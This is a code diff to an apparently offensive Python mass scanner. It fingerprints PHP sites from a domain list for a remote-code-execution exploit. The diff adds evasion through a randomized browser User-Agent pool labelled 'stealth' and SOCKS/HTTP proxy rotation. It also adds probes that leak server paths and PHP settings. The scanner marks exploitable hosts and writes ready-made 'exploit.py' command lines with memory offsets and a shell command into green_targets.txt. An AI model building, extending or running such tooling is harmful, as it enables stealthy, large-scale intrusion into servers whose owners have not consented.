@@ -7,7 +7,7 @@ The exploit itself is not executed; targets are identified and classified.
 
 Usage:
   python3 scan.py --input domains.txt --out results.jsonl
-  python3 scan.py --input domains.txt --summary out.csv --concurrency 30
+  python3 scan.py --input domains.txt --summary out.csv --concurrency 30 --random-ua
 """
 from __future__ import annotations
 
@@ -18,6 +18,7 @@ import datetime
 import json
 import math
 import os
+import random
 import re
 import signal
 import sys
@@ -25,6 +26,14 @@ import time
 from dataclasses import dataclass, field
 from typing import Any, Awaitable, Optional
 from urllib.parse import urlparse
+
+# uvloop integration (Linux/macOS)
+try:
+    import uvloop
+    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
+    _HAVE_UVLOOP = True
+except Exception:
+    _HAVE_UVLOOP = False
 
 try:
     import aiohttp
@@ -40,37 +49,107 @@ except ImportError:  # fallback: httpx
         sys.stderr.write("pip install aiohttp   (veya)   pip install httpx\n")
         sys.exit(2)
 
-# ------------------------------------------------------------------ config
+try:
+    import aiohttp_socks
+    _HAVE_AIOHTTP_SOCKS = True
+except ImportError:
+    _HAVE_AIOHTTP_SOCKS = False
+
+# ------------------------------------------------------------------ config & stealth
 UA_DEFAULT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36")
+              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36")
+
+UA_POOL: list[tuple[str, dict[str, str]]] = [
+    # Chrome on Windows
+    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
+     {"Sec-Ch-Ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"', "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"'}),
+    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
+     {"Sec-Ch-Ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"', "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"'}),
+    # Edge on Windows
+    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
+     {"Sec-Ch-Ua": '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"', "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"'}),
+    # Chrome on macOS
+    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
+     {"Sec-Ch-Ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"', "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"macOS"'}),
+    # Safari on macOS
+    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
+     {}),
+    # Firefox on Windows
+    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
+     {}),
+    # Firefox on Linux
+    ("Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
+     {}),
+    # Chrome on Linux
+    ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
+     {"Sec-Ch-Ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"', "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Linux"'}),
+]
+
+def get_browser_headers(ua: str | None = None, ch_hints: dict[str, str] | None = None) -> dict[str, str]:
+    headers = {
+        "User-Agent": ua or UA_DEFAULT,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Language": "en-US,en;q=0.9,tr;q=0.8",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-User": "?1",
+    }
+    if ch_hints:
+        headers.update(ch_hints)
+    return headers
+
 PHPINFO_PATHS = ["/phpinfo.php", "/info.php", "/test.php",
                  "/php_info.php", "/p.php", "/i.php",
                  "/.user.ini", "/composer.json",
                  "/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000"]
+
+# Regexes
 VER_RE = re.compile(rb"PHP[/\s]+(\d+)\.(\d+)\.(\d+)")
 VER_RE_H = re.compile(rb"PHP\s+(\d+\.\d+\.\d+)")
 BARE_VER_RE = re.compile(rb"^\s*(\d+)\.(\d+)\.(\d+)\s*$")
+PHP_BODY_VER_RE = re.compile(
+    rb"(?:PHP Version|PHP\/|X-Powered-By:\s*PHP\/|<b>PHP Version<\/b>\s*<\/td><td>)\s*(\d+\.\d+\.\d+)",
+    re.IGNORECASE)
+SERVER_BANNER_RE = re.compile(
+    rb"(?:<address>|<hr>|<i>)\s*([A-Za-z0-9_.-]+/[0-9.]+(?:\s*\([^)]+\))?(?:\s+PHP/[0-9.]+)?(?:\s+OpenSSL/[0-9.]+)?)[\s<]",
+    re.IGNORECASE)
+PHP_ERROR_RE = re.compile(
+    rb"(?:Fatal error|Parse error|Warning|Notice|Deprecated):\s+(?:.*?)\s+in\s+<b>(.*?)<\/b>\s+on\s+line\s+<b>(\d+)<\/b>",
+    re.IGNORECASE)
+PHP_ERROR_PLAIN_RE = re.compile(
+    rb"(?:Fatal error|Parse error|Warning|Notice|Deprecated):\s+(?:.*?)\s+in\s+([^\s<]+\.php)\s+on\s+line\s+(\d+)",
+    re.IGNORECASE)
 MEM_RE = re.compile(rb"Allowed memory size of (\d+) bytes exhausted")
 POST_RE = re.compile(rb"POST Content-Length of (\d+) bytes exceeds the limit of (\d+) bytes")
 MAXVAR_RE = re.compile(rb"Input variables exceeded (\d+)")
-# PHPSESSID cookie signature
 SID_RE = re.compile(rb"PHPSESSID=([A-Za-z0-9]+)")
 CDN_RE = re.compile(
     rb"(cloudflare|CF-RAY|akamai|sucuri|imperva|fastly|incapsula|bigip|f5)",
     re.IGNORECASE)
-# Distro signature: Server: Apache (Debian)
 DISTRO_RE = re.compile(rb"\(([^()]{2,20})\)")
+FASTCGI_ERR_RE = re.compile(rb"(?:Primary script unknown|File not found|FastCGI|php-fpm)", re.IGNORECASE)
+LITESPEED_ERR_RE = re.compile(rb"(?:LiteSpeed Web Server|Proudly powered by LiteSpeed)", re.IGNORECASE)
 
 
 def parse_ver(raw: bytes | str) -> Optional[tuple[int, int, int]]:
     blob = raw if isinstance(raw, bytes) else raw.encode("latin-1", "replace")
-    for rx in (VER_RE, VER_RE_H, BARE_VER_RE):
+    for rx in (VER_RE, VER_RE_H, PHP_BODY_VER_RE, BARE_VER_RE):
         m = rx.search(blob)
         if m:
-            parts = m.group(1).split(".") if len(m.groups()) == 1 else None
+            parts = m.group(1).split(b"." if isinstance(m.group(1), bytes) else ".") if len(m.groups()) == 1 else None
             if parts and len(parts) == 3:
-                return (int(parts[0]), int(parts[1]), int(parts[2]))
-            return (int(m.group(1)), int(m.group(2)), int(m.group(3)))
+                try:
+                    return (int(parts[0]), int(parts[1]), int(parts[2]))
+                except ValueError:
+                    pass
+            elif len(m.groups()) >= 3:
+                try:
+                    return (int(m.group(1)), int(m.group(2)), int(m.group(3)))
+                except ValueError:
+                    pass
     return None
 
 
@@ -91,7 +170,7 @@ def affected(v: Optional[tuple[int, int, int]]) -> Optional[bool]:
             return True
         if mi == 5 and pa < 12:
             return True
-    return False  # version found but outside the affected range
+    return False
 
 
 @dataclass
@@ -216,9 +295,33 @@ def suggest_args(rec: Rec) -> dict:
     }
 
 
-# ------------------------------------------------------------------ HTTP
+# ------------------------------------------------------------------ Proxy Rotator
+class ProxyRotator:
+    def __init__(self, single_proxy: str | None, proxy_file: str | None):
+        self.proxies: list[str] = []
+        if single_proxy:
+            self.proxies.append(single_proxy.strip())
+        if proxy_file and os.path.exists(proxy_file):
+            with open(proxy_file, "r", encoding="utf-8", errors="replace") as f:
+                for line in f:
+                    p = line.strip()
+                    if p and not p.startswith("#"):
+                        if not p.startswith(("http://", "https://", "socks5://", "socks5h://", "socks4://")):
+                            p = f"http://{p}"
+                        self.proxies.append(p)
+        self._pos = 0
+
+    def get_proxy(self) -> str | None:
+        if not self.proxies:
+            return None
+        p = self.proxies[self._pos % len(self.proxies)]
+        self._pos += 1
+        return p
+
+
+# ------------------------------------------------------------------ HTTP client
 class HTTP:
-    """aiohttp-based client with a host-scoped cookie jar."""
+    """aiohttp-based client with connection pooling, DNS cache and proxy rotation."""
 
     def __init__(self, args):
         self.args = args
@@ -230,9 +333,17 @@ class HTTP:
         self._insecure = args.insecure
         self._timeout_conn = 10
         self._timeout_read = 15
+        self.proxy_rotator = ProxyRotator(args.proxy, getattr(args, "proxy_file", None))
+
+        # Async DNS caching
+        self._resolver = None
+        try:
+            import aiodns
+            self._resolver = aiohttp.AsyncResolver()
+        except Exception:
+            pass
 
     async def _throttle(self, host: str) -> None:
-        """Apply the configured per-host request rate limit."""
         if self.args.rate <= 0:
             return
         async with self._rate_guard:
@@ -248,9 +359,18 @@ class HTTP:
     def _attempts(self) -> int:
         return max(1, self.args.retries + 1)
 
+    def _get_ua_and_headers(self) -> tuple[str, dict[str, str]]:
+        if self.args.ua:
+            return self.args.ua, get_browser_headers(self.args.ua)
+        if getattr(self.args, "random_ua", True):
+            ua_str, hints = random.choice(UA_POOL)
+            return ua_str, get_browser_headers(ua_str, hints)
+        return UA_DEFAULT, get_browser_headers(UA_DEFAULT)
+
     async def _get_session(self, host: str) -> Any:
         async with self._lock:
             if host not in self._sessions:
+                ua_str, default_hdrs = self._get_ua_and_headers()
                 if _HAVE_AIOHTTP:
                     jar = aiohttp.CookieJar(unsafe=True)
                     sslctx = None
@@ -259,20 +379,32 @@ class HTTP:
                         sslctx = _ssl.create_default_context()
                         sslctx.check_hostname = False
                         sslctx.verify_mode = _ssl.CERT_NONE
+                    
+                    # High performance connection pooling + async DNS cache
+                    connector = TCPConnector(
+                        ssl=sslctx,
+                        use_dns_cache=True,
+                        ttl_dns_cache=300,
+                        limit=max(100, self.args.concurrency * 2),
+                        limit_per_host=10,
+                        enable_cleanup_closed=True,
+                        keepalive_timeout=30.0,
+                        resolver=self._resolver,
+                    )
                     self._sessions[host] = ClientSession(
                         cookie_jar=jar,
                         timeout=ClientTimeout(
                             connect=self._timeout_conn,
                             total=60 if self.args.timeout > 20 else self.args.timeout),
-                        connector=TCPConnector(ssl=sslctx),
-                        headers={"User-Agent": self.args.ua or UA_DEFAULT},
+                        connector=connector,
+                        headers=default_hdrs,
                     )
                 else:
                     self._sessions[host] = httpx.AsyncClient(
-                        headers={"User-Agent": self.args.ua or UA_DEFAULT},
+                        headers=default_hdrs,
                         verify=not self._insecure,
                         timeout=httpx.Timeout(self.args.timeout),
-                        proxy=self.args.proxy,
+                        proxy=self.proxy_rotator.get_proxy(),
                     )
             return self._sessions[host]
 
@@ -289,10 +421,11 @@ class HTTP:
         except Exception:
             pass
 
-    async def get(self, url: str) -> dict:
+    async def get(self, url: str, extra_headers: dict | None = None) -> dict:
         host = urlparse(url).hostname or ""
         out = {"ok": False, "status": None, "headers": {}, "body": b"",
                "final_url": url, "error": None}
+        cur_proxy = self.proxy_rotator.get_proxy()
         for attempt in range(self._attempts()):
             try:
                 await self._throttle(host)
@@ -303,8 +436,10 @@ class HTTP:
                         "max_redirects": 5,
                         "read_bufsize": self.args.max_body,
                     }
-                    if self.args.proxy:
-                        request_args["proxy"] = self.args.proxy
+                    if cur_proxy:
+                        request_args["proxy"] = cur_proxy
+                    if extra_headers:
+                        request_args["headers"] = extra_headers
                     async with s.get(url, **request_args) as resp:
                         out["status"] = resp.status
                         out["final_url"] = str(resp.url)
@@ -312,7 +447,8 @@ class HTTP:
                         body = await resp.read()
                         out["body"] = body[:self.args.max_body]
                 else:
-                    resp = await s.get(url, follow_redirects=True)
+                    hdrs = extra_headers or {}
+                    resp = await s.get(url, follow_redirects=True, headers=hdrs)
                     out["status"] = resp.status_code
                     out["final_url"] = str(resp.url)
                     out["headers"] = {k.lower(): v for k, v in resp.headers.items()}
@@ -332,6 +468,7 @@ class HTTP:
         host = urlparse(url).hostname or ""
         out = {"ok": False, "status": None, "headers": {}, "body": b"",
                "error": None, "final_url": url}
+        cur_proxy = self.proxy_rotator.get_proxy()
         for attempt in range(self._attempts()):
             try:
                 await self._throttle(host)
@@ -347,8 +484,8 @@ class HTTP:
                         "allow_redirects": True,
                         "max_redirects": 5,
                     }
-                    if self.args.proxy:
-                        post_args["proxy"] = self.args.proxy
+                    if cur_proxy:
+                        post_args["proxy"] = cur_proxy
                     async with s.post(url, **post_args) as resp:
                         out["status"] = resp.status
                         out["final_url"] = str(resp.url)
@@ -378,16 +515,12 @@ class HTTP:
 
     async def post_content_length_mismatch(self, url: str,
                                            declared: int) -> dict:
-        """P1: Declare a large Content-Length and cut the body short.
-        The post_max_size warning is generated during request startup,
-        before the body is read. If display_errors=On, it appears in the body."""
         host = urlparse(url).hostname or ""
         out = {"ok": False, "status": None, "headers": {}, "body": b"",
                "error": None, "final_url": url}
         try:
             await self._throttle(host)
             if _HAVE_AIOHTTP:
-                # Use a raw socket: large Content-Length, short body, shutdown(WR)
                 import socket as _s
                 u = urlparse(url)
                 port = u.port or (443 if u.scheme == "https" else 80)
@@ -402,14 +535,15 @@ class HTTP:
                 path = u.path or "/"
                 if u.query:
                     path += "?" + u.query
+                ua_str, _ = self._get_ua_and_headers()
                 req = (f"POST {path} HTTP/1.1\r\n"
                        f"Host: {u.hostname}\r\n"
-                       f"User-Agent: {self.args.ua or UA_DEFAULT}\r\n"
+                       f"User-Agent: {ua_str}\r\n"
                        f"Content-Length: {declared}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Connection: close\r\n\r\n").encode("latin-1")
                 sock.sendall(req + b"a=" + b"x" * 2048)
-                sock.shutdown(_s.SHUT_WR)  # Half-close the TCP write side
+                sock.shutdown(_s.SHUT_WR)
                 sock.settimeout(15)
                 data = bytearray()
                 while True:
@@ -435,7 +569,6 @@ class HTTP:
                             v.strip().decode("latin-1", "replace")
                 out["body"] = (raw[hend + 4:] if hend > 0 else b"")[:self.args.max_body]
             else:
-                # httpx fallback: override the Content-Length header
                 s = await self._get_session(host)
                 hdrs = {"Content-Length": str(declared), "Connection": "close"}
                 try:
@@ -482,9 +615,6 @@ PHPINFO_KEYS = {
 
 def parse_phpinfo(body: bytes) -> dict:
     out: dict[str, Any] = {}
-    # Table layout: <td>key</td><td>value</td> or key : value
-    text = body.decode("latin-1", "replace")
-    # memory_limit / post_max_size: "8M" / "80M" / "128M"
     for key, (rx_a, rx_b) in PHPINFO_KEYS.items():
         pat = re.compile(
             (rx_a.decode("latin-1") + r".*?<[^>]+>\s*([^\s<]+)")
@@ -493,11 +623,9 @@ def parse_phpinfo(body: bytes) -> dict:
         m = pat.search(body)
         if m:
             out[key] = m.group(1).decode("latin-1", "replace")
-    # Version
     v = parse_ver(body)
     if v:
         out["php_version"] = ".".join(map(str, v))
-    # memory_limit / post_max_size: "8M" -> bytes
     for k in ("memory_limit", "post_max_size"):
         val = out.get(k)
         if val:
@@ -519,7 +647,6 @@ def parse_phpinfo(body: bytes) -> dict:
                     out[k] = int(val)
                 except ValueError:
                     out[k] = None
-    # display_errors: On/Off/1/0
     val = out.get("display_errors")
     if val:
         out["display_errors"] = val.upper() in ("ON", "1")
@@ -535,7 +662,7 @@ def parse_phpinfo(body: bytes) -> dict:
     return out
 
 
-# ------------------------------------------------------------------ probes
+# ------------------------------------------------------------------ Probes
 class Probes:
     def __init__(self, http: HTTP, args):
         self.http = http
@@ -550,8 +677,7 @@ class Probes:
         return True
 
     async def fingerprint(self, url: str, rec: Rec) -> bool:
-        """3.1-3.5: headers + phpinfo + version + SAPI.
-        Returns True if phpinfo was found (the configuration is available)."""
+        """Extract headers, error signatures, phpinfo, version and SAPI."""
         out = await self.http.get(url)
         if not out["ok"]:
             rec.error = out["error"]
@@ -561,31 +687,59 @@ class Probes:
         rec.url_used = url
         h = out["headers"]
         rec.server = h.get("server")
-        # Distro signature
+
+        # Server distro signature
         if rec.server:
             m = DISTRO_RE.search(rec.server.encode("latin-1", "replace"))
             if m:
                 rec.server_distro = m.group(1).decode("latin-1", "replace")
-        # CDN/WAF
+
+        # CDN / WAF detection
         cdn_blob = (rec.server or "").encode("latin-1", "replace")
-        for k in ("cf-ray", "x-sucuri-id", "x-akamai-serial", "server"):
+        for k in ("cf-ray", "x-sucuri-id", "x-akamai-serial", "server", "x-cdn"):
             v = h.get(k, "")
             if v:
                 cdn_blob += v.encode("latin-1", "replace")
         rec.cdn = bool(CDN_RE.search(cdn_blob))
         if rec.cdn:
             rec.notes.append("CDN/WAF behind")
-        # PHP version
+
+        # Enhanced version extraction from headers & error banners
         ver_raw = h.get("x-powered-by", "")
+        if not ver_raw:
+            ver_raw = h.get("x-cf-powered-by", "")
         if not ver_raw:
             ver_raw = (rec.server or "")
         v = parse_ver(ver_raw)
         if v:
             rec.php_version = ".".join(map(str, v))
+
+        # Check response body for address banners / error page disclosures (404/405/413/500/etc.)
+        if not rec.php_version and out["body"]:
+            addr_m = SERVER_BANNER_RE.search(out["body"])
+            if addr_m:
+                banner = addr_m.group(1).decode("latin-1", "replace").strip()
+                if not rec.server:
+                    rec.server = banner
+                if "PHP/" in banner:
+                    v_banner = parse_ver(banner)
+                    if v_banner:
+                        rec.php_version = ".".join(map(str, v_banner))
+                        rec.notes.append("Version from server error banner")
+
+        # Check for PHP error path leaks
+        if out["body"]:
+            err_m = PHP_ERROR_RE.search(out["body"]) or PHP_ERROR_PLAIN_RE.search(out["body"])
+            if err_m:
+                leaked_path = err_m.group(1).decode("latin-1", "replace")
+                rec.display_errors = True
+                rec.notes.append(f"LEAKED_PATH:{leaked_path}")
+
         # Set-Cookie: PHPSESSID -> PHP + active session
         setc = h.get("set-cookie", "")
         has_sid = bool(SID_RE.search(setc.encode("latin-1", "replace")))
-        # Try phpinfo only if the version was not found
+
+        # Try phpinfo paths if version is not yet resolved
         if rec.php_version is None:
             for p in PHPINFO_PATHS:
                 if not self.spend(1):
@@ -601,15 +755,16 @@ class Probes:
                     rec.phpinfo_path = p
                     if "php_version" in parsed:
                         rec.php_version = parsed["php_version"]
-                    rec._phpinfo = parsed  # internal
+                    rec._phpinfo = parsed
                     break
+
         if rec.php_version:
             v = parse_ver(rec.php_version)
             rec.affected_version = affected(v)
         elif rec.status_code is not None:
-            # Version not found but the site is reachable -> affected status unknown
             rec.affected_version = None
-        # SAPI (3.3): exact from phpinfo when available, otherwise heuristic
+
+        # SAPI heuristics: headers, phpinfo, FastCGI headers, LiteSpeed, etc.
         sapi_from_info = None
         if hasattr(rec, "_phpinfo"):
             sa = rec._phpinfo.get("server_api", "")
@@ -623,23 +778,49 @@ class Probes:
                 sapi_from_info = "frankenphp"
             elif "cgi" in sa.lower():
                 sapi_from_info = "cgi"
+
         if sapi_from_info:
             rec.sapi = sapi_from_info
             rec.sapi_confidence = "high"
         else:
             srv = (rec.server or "").lower()
-            if "nginx" in srv:
+            if "x-accel-buffering" in h or "x-fastcgi-cache" in h:
+                rec.sapi = "fpm"
+                rec.sapi_confidence = "medium"
+            elif FASTCGI_ERR_RE.search(out["body"]):
+                rec.sapi = "fpm"
+                rec.sapi_confidence = "medium"
+            elif LITESPEED_ERR_RE.search(out["body"]) or "litespeed" in srv:
+                rec.sapi = "litespeed"
+                rec.sapi_confidence = "high" if "litespeed" in srv else "medium"
+            elif "frankenphp" in srv:
+                rec.sapi = "frankenphp"
+                rec.sapi_confidence = "high"
+            elif "nginx" in srv:
                 rec.sapi = "fpm"
                 rec.sapi_confidence = "medium"
             elif "apache" in srv:
                 rec.sapi = "mod_php"
                 rec.sapi_confidence = "low"
-            elif "litespeed" in srv or "caddy" in srv or "openresty" in srv:
+            elif "caddy" in srv or "openresty" in srv:
                 rec.sapi = "fpm"
                 rec.sapi_confidence = "low"
             else:
                 rec.sapi = None
                 rec.sapi_confidence = "low"
+
+        # Optional probe for non-existent PHP endpoint to force 404/error disclosing server
+        if getattr(self.args, "probe_error_page", False) and rec.php_version is None:
+            if self.spend(1):
+                err_u = url.rstrip("/") + "/_p2_nonexistent_probe_404.php"
+                err_resp = await self.http.get(err_u)
+                if err_resp["ok"] and err_resp["body"]:
+                    v_err = parse_ver(err_resp["body"])
+                    if v_err:
+                        rec.php_version = ".".join(map(str, v_err))
+                        rec.notes.append("Version from error probe")
+                        rec.affected_version = affected(v_err)
+
         # HTTP/HTTPS consistency
         if url.startswith("https://"):
             hp = url.replace("https://", "http://", 1)
@@ -651,9 +832,6 @@ class Probes:
         return rec.phpinfo_path is not None
 
     async def p1_display_postmax(self, url: str, rec: Rec) -> None:
-        """P1: Declare a 1 GB Content-Length, send a short body, shutdown(WR).
-        'POST Content-Length ... exceeds the limit of Y' -> post_max_size=Y.
-        If the warning appears in the body -> display_errors=1."""
         if not self.spend(1):
             return
         out = await self.http.post_content_length_mismatch(url, 1073741824)
@@ -665,20 +843,12 @@ class Probes:
             rec.post_max_size = int(m.group(2))
             rec.display_errors = True
             rec.notes.append("P1: post_max_size from warning")
-        else:
-            # Determine display_errors from whether the P3 warning appears
-            # in the response body (P3 performs the actual check).
-            pass
 
     async def p2_memory_limit(self, url: str, rec: Rec) -> None:
-        """P2: Send a body below post_max_size but above memory_limit.
-        'Allowed memory size of N bytes exhausted' -> memory_limit=N."""
-        # Only for affected + mod_php candidates
         if rec.affected_version is not True:
             return
         if rec.sapi != "mod_php":
             return
-        # Progressive sizes: 1, 2, 4, and 6 MB (do not exceed post_max_size)
         pms = rec.post_max_size or (16 * 1048576)
         bodies = []
         for mb in (1, 2, 4, 6):
@@ -687,14 +857,12 @@ class Probes:
                 bodies.append((mb, size))
         if not bodies:
             return
-        for mb, size in reversed(bodies):  # Largest to smallest
+        for mb, size in reversed(bodies):
             if not self.spend(1):
                 break
-            # Body: very small URL-encoded fields (memory amplification)
             n_fields = max(100, size // 1024)
             parts = [f"field_{i}={i}" for i in range(min(n_fields, 5000))]
             body = ("&".join(parts)).encode("latin-1", "replace")
-            # Do not exceed post_max_size: reduce the body size
             if len(body) > pms:
                 body = body[:pms - 1024]
             out = await self.http.post(
@@ -708,14 +876,11 @@ class Probes:
                 rec.memory_limit = int(m.group(1))
                 rec.notes.append("P2: memory_limit from fatal")
                 return
-        # No fatal error -> memory_limit >= largest attempted size * 4
         if bodies:
             rec.memory_limit = bodies[-1][1] * 4
             rec.notes.append("P2: memory_limit >= tried*4 (no fatal)")
 
     async def p3_max_input_vars(self, url: str, rec: Rec) -> None:
-        """P3: Send 1001 URL-encoded fields -> 'Input variables exceeded N'
-        -> max_input_vars=N. Also determines display_errors."""
         if not self.spend(1):
             return
         parts = [f"v{i}=x" for i in range(1001)]
@@ -731,15 +896,11 @@ class Probes:
             rec.display_errors = True
             rec.notes.append("P3: max_input_vars from warning")
         elif rec.display_errors is None:
-            # No warning -> display_errors=0 (the warning is not exposed in the body)
             rec.display_errors = False
 
     async def p4_upload_progress(self, url: str, rec: Rec) -> None:
-        """P4: multipart + PHP_SESSION_UPLOAD_PROGRESS + file part,
-        without a cookie. Set-Cookie: PHPSESSID -> upload_progress=1,
-        use_cookies=1."""
         if rec.phpinfo_path:
-            return  # configuration is already available
+            return
         if not self.spend(1):
             return
         boundary = "----php2shellprobe"
@@ -771,15 +932,12 @@ class Probes:
             rec.notes.append("P4: NO_UPLOAD_PROGRESS")
 
     async def p5_strict_mode(self, url: str, rec: Rec) -> None:
-        """P5: P4 + Cookie: PHPSESSID=<32-character new ID>.
-        If the same ID is returned, strict_mode=0; otherwise it is 1.
-        PHPSESSID is sent as both a cookie and a multipart field."""
         if rec.phpinfo_path:
             return
         if not self.spend(1):
             return
         boundary = "----php2shellprobe2"
-        fake_id = "attacksessionid0001abcd"  # 32 char
+        fake_id = "attacksessionid0001abcd"
         body = (
             f"--{boundary}\r\n"
             f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
@@ -815,12 +973,10 @@ async def process_target(host: str, http: HTTP, args,
     t0 = time.time()
     u = urlparse(host)
     if not u.netloc:
-        # Domain (not a URL)
         base_url = f"https://{host}"
     else:
         base_url = host if host.startswith("http") else f"https://{host}"
 
-    # Scheme fallback
     url_used = None
     if base_url.startswith("http://"):
         url_used = base_url
@@ -844,16 +1000,11 @@ async def process_target(host: str, http: HTTP, args,
     probes = Probes(http, args)
     try:
         has_info = await probes.fingerprint(url_used, rec)
-        # Run the remaining probes within the budget
-        # P1: optional active probe
         if args.probe_post_max:
             await probes.p1_display_postmax(url_used, rec)
-        # P3: always (cheap, determines display_errors)
         await probes.p3_max_input_vars(url_used, rec)
-        # P4/P5: upload_progress + strict mode
         await probes.p4_upload_progress(url_used, rec)
         await probes.p5_strict_mode(url_used, rec)
-        # P2: optional active probe for affected + mod_php targets
         if args.probe_memory:
             await probes.p2_memory_limit(url_used, rec)
     except Exception as e:
@@ -900,14 +1051,16 @@ class Driver:
                         pass
 
     async def writer(self) -> None:
-        while True:
-            rec: Rec = await self._write_q.get()
-            if rec is None:
-                break
-            async with self.lock:
+        mode = "a" if self.args.jsonl_append else "w"
+        with open(self.args.out, mode, encoding="utf-8", buffering=1) as f:
+            while True:
+                item = await self._write_q.get()
+                if item is None:
+                    break
+                rec = item
                 self.results.append(rec)
-                with open(self.args.out, "a", encoding="utf-8") as f:
-                    f.write(json.dumps(rec.to_dict(), ensure_ascii=False) + "\n")
+                self.done.add(rec.host)
+                f.write(json.dumps(rec.to_dict(), ensure_ascii=False) + "\n")
                 if not self.args.quiet:
                     print(f"[{rec.verdict:10}] {rec.host:40} "
                           f"php={rec.php_version or '?':10} "
@@ -920,7 +1073,6 @@ class Driver:
         else:
             with open(self.args.out, "w", encoding="utf-8"):
                 pass
-        # Target list
         targets: list[str] = []
         with open(self.args.input, "r", encoding="utf-8",
                   errors="replace") as f:
@@ -936,7 +1088,13 @@ class Driver:
                     continue
                 targets.append(ln)
         if not self.args.quiet:
-            print(f"Targets: {len(targets)} (skipped: {len(self.done)})", flush=True)
+            print(f"Targets: {len(targets)} (skipped: {len(self.done)})")
+            if _HAVE_UVLOOP:
+                print("[+] Engine: uvloop activated (high performance)")
+            if self.args.proxy or getattr(self.args, 'proxy_file', None):
+                print("[+] Proxy routing: enabled")
+            if getattr(self.args, 'random_ua', False):
+                print("[+] Stealth: randomized browser headers and UA pool active")
 
         http = HTTP(self.args)
         sem = asyncio.Semaphore(self.args.concurrency)
@@ -954,7 +1112,6 @@ class Driver:
                 break
             tasks.append(asyncio.create_task(work(t)))
 
-        # Ctrl+C
         loop = asyncio.get_running_loop()
 
         def _sig():
@@ -968,14 +1125,8 @@ class Driver:
             except Exception:
                 pass
 
-        # Start the writer
         writer_task = asyncio.create_task(self.writer())
-
-        # Process targets
-        # Wait for tasks to finish (stop.wait() or Ctrl+C)
         await asyncio.gather(*tasks, return_exceptions=True)
-
-        # Send None to stop the writer
         await self._write_q.put(None)
         await writer_task
 
@@ -983,9 +1134,7 @@ class Driver:
         from collections import Counter
         c: Counter = Counter(r.verdict for r in self.results)
         total = len(self.results)
-        if self.args.quiet:
-            pass
-        else:
+        if not self.args.quiet:
             print("\n" + "=" * 50, flush=True)
             print(f"TOTAL: {total}", flush=True)
             for k, v in c.most_common():
@@ -999,20 +1148,19 @@ class Driver:
                     print(f"  {r.exploitability_score:3} {r.url_used}", flush=True)
             print("=" * 50, flush=True)
 
-        # green_targets.txt
         with open("green_targets.txt", "w", encoding="utf-8") as f:
             for r in self.results:
                 if r.verdict != "GREEN" or not r.suggested_exploit_args:
                     continue
                 a = r.suggested_exploit_args
                 f.write(
-                    f"python3 exploit.py {a.get('-u','')} "
-                    f"--offsets-file '' "
-                    f"--zif-offset {a.get('--zif-offset','0x465370')} "
-                    f"--dtor-offset {a.get('--dtor-offset','0x65eb60')} "
-                    f"--huge-mb {a.get('--huge-mb',12)} "
-                    f"--retries 30 --proof-file '' "
-                    f"--fetch {a.get('--fetch','/x')} -c 'id>x'\n")
+                    f"python3 exploit.py {a.get('-u','')}"
+                    f" --offsets-file ''"
+                    f" --zif-offset {a.get('--zif-offset','0x465370')}"
+                    f" --dtor-offset {a.get('--dtor-offset','0x65eb60')}"
+                    f" --huge-mb {a.get('--huge-mb',12)}"
+                    f" --retries 30 --proof-file ''"
+                    f" --fetch {a.get('--fetch','/x')} -c 'id>x'\n")
         if self.args.summary:
             with open(self.args.summary, "w", newline="",
                       encoding="utf-8") as f:
@@ -1036,7 +1184,9 @@ def main() -> int:
     ap.add_argument("--concurrency", type=int, default=30)
     ap.add_argument("--timeout", type=float, default=12)
     ap.add_argument("--retries", type=int, default=2)
-    ap.add_argument("--ua", default=None)
+    ap.add_argument("--ua", default=None, help="custom User-Agent string")
+    ap.add_argument("--random-ua", action="store_true",
+                    help="enable realistic browser header & User-Agent rotation")
     ap.add_argument("--insecure", action="store_true",
                      help="disable TLS certificate verification")
     ap.add_argument("--rate", type=float, default=0,
@@ -1054,11 +1204,15 @@ def main() -> int:
     ap.add_argument("--summary", default=None,
                     help="summary CSV path")
